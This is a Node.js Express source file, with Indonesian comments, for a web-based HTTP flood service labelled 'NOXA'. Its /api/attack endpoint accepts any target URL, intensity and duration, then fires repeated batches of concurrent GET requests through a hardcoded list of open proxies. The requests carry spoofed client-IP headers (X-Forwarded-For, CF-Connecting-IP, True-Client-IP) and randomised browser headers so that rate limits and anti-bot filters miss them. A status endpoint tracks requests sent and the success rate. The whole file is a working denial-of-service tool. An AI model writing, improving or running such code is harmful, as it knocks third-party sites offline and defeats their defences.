const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { 
    getRandomUserAgent, 
    getRandomReferer, 
    getRandomLanguage,
    getRandomAccept,
    generateRandomIP,
    generateXForwardedFor
} = require('../utils/agents');

const app = express();
app.use(express.json());

// Database proxy gratis (real-time)
const freeProxies = [
    'http://45.77.56.109:3128',
    'http://103.141.143.102:4153',
    'http://190.109.168.217:8080',
    'http://154.236.189.13:1976',
    'http://103.166.154.33:3125',
    'http://38.156.233.82:999',
    'http://186.121.235.66:8080',
    'http://103.48.68.34:83',
    'http://190.97.233.18:999',
    'http://45.224.119.37:999'
];

// Cache untuk tracking attack
const activeAttacks = new Map();

async function makeRequest(targetUrl, attackId) {
    try {
        const proxyUrl = freeProxies[Math.floor(Math.random() * freeProxies.length)];
        const agent = targetUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl)
            : new HttpProxyAgent(proxyUrl);
        
        const headers = {
            'User-Agent': getRandomUserAgent(),
            'Accept': getRandomAccept(),
            'Accept-Language': getRandomLanguage(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': getRandomReferer(),
            'DNT': Math.random() > 0.5 ? '1' : '0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': generateXForwardedFor(),
            'X-Real-IP': generateRandomIP(),
            'X-Client-IP': generateRandomIP(),
            'CF-Connecting-IP': generateRandomIP(),
            'True-Client-IP': generateRandomIP()
        };

        // Random delay untuk simulasi human
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 500));
        
        const response = await axios.get(targetUrl, {
            headers,
            httpsAgent: agent,
            httpAgent: agent,
            timeout: 10000,
            validateStatus: () => true // Accept semua status
        });
        
        return {
            success: true,
            status: response.status,
            proxy: proxyUrl,
            userAgent: headers['User-Agent'].substring(0, 50) + '...'
        };
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

app.post('/api/attack', async (req, res) => {
    const { url, intensity, duration } = req.body;
    
    // Validasi input
    if (!url || !url.startsWith('http')) {
        return res.status(400).json({ error: 'URL tidak valid' });
    }
    
    const attackId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const intensityLevel = parseInt(intensity) || 100;
    const durationSeconds = parseInt(duration) || 60;
    
    // Simpan attack ke cache
    activeAttacks.set(attackId, {
        url,
        intensity: intensityLevel,
        startTime: Date.now(),
        endTime: Date.now() + (durationSeconds * 1000),
        requestsSent: 0,
        requestsSuccess: 0,
        requestsFailed: 0
    });
    
    // Mulai attack di background
    startAttack(attackId, url, intensityLevel, durationSeconds);
    
    res.json({
        success: true,
        attackId,
        message: `Attack dimulai ke ${url}`,
        intensity: intensityLevel,
        duration: durationSeconds,
        estimatedRequests: intensityLevel * durationSeconds
    });
});

async function startAttack(attackId, targetUrl, intensity, durationSeconds) {
    const endTime = Date.now() + (durationSeconds * 1000);
    const requestsPerSecond = intensity;
    
    console.log(`[NOXA] Starting attack ${attackId} on ${targetUrl}`);
    
    while (Date.now() < endTime) {
        const attackInfo = activeAttacks.get(attackId);
        if (!attackInfo) break;
        
        // Kirim batch request
        const promises = [];
        for (let i = 0; i < requestsPerSecond; i++) {
            promises.push(makeRequest(targetUrl, attackId));
        }
        
        try {
            const results = await Promise.allSettled(promises);
            
            // Update stats
            attackInfo.requestsSent += requestsPerSecond;
            attackInfo.requestsSuccess += results.filter(r => r.status === 'fulfilled' && r.value.success).length;
            attackInfo.requestsFailed += results.filter(r => r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)).length;
            
            activeAttacks.set(attackId, attackInfo);
        } catch (error) {
            console.error('Batch error:', error.message);
        }
        
        // Delay 1 detik antara batch
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log(`[NOXA] Attack ${attackId} completed`);
    // Hapus setelah 5 menit
    setTimeout(() => activeAttacks.delete(attackId), 300000);
}

app.get('/api/attack/:id', (req, res) => {
    const attackId = req.params.id;
    const attackInfo = activeAttacks.get(attackId);
    
    if (!attackInfo) {
        return res.status(404).json({ error: 'Attack tidak ditemukan' });
    }
    
    const elapsed = Date.now() - attackInfo.startTime;
    const remaining = Math.max(0, attackInfo.endTime - Date.now());
    
    res.json({
        attackId,
        url: attackInfo.url,
        intensity: attackInfo.intensity,
        elapsedTime: Math.floor(elapsed / 1000),
        remainingTime: Math.floor(remaining / 1000),
        requestsSent: attackInfo.requestsSent,
        requestsSuccess: attackInfo.requestsSuccess,
        requestsFailed: attackInfo.requestsFailed,
        successRate: attackInfo.requestsSent > 0 
            ? ((attackInfo.requestsSuccess / attackInfo.requestsSent) * 100).toFixed(2)
            : 0
    });
});

module.exports = app;
